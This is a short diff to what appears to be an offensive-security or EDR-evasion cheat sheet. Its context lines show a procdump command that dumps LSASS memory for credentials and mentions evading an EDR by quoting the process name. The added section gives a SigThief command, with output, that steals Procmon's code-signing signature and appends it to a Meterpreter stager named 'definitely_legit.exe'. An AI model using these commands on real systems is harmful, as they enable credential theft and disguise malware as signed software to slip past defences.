@@ -411,3 +411,17 @@ Depending on the EDR, it may be sufficient to simply add quotations around the p
 ```
 procdump.exe -accepteula -ma “lsass.exe” out.dmp
 ```
+
+## Stealing Signatures with SigThief:
+
+Download: https://github.com/secretsquirrel/SigThief
+
+Rips a signature off a signed PE file and appends it to another one, fixing up the certificate table to sign the file.
+
+```
+$ ./sigthief.py -i procmon.exe -t x86_meterpreter_stager.exe -o /tmp/definitely_legit.exe 
+
+Output file: /tmp/definitely_legit.exe 
+Signature appended. 
+FIN.
+```
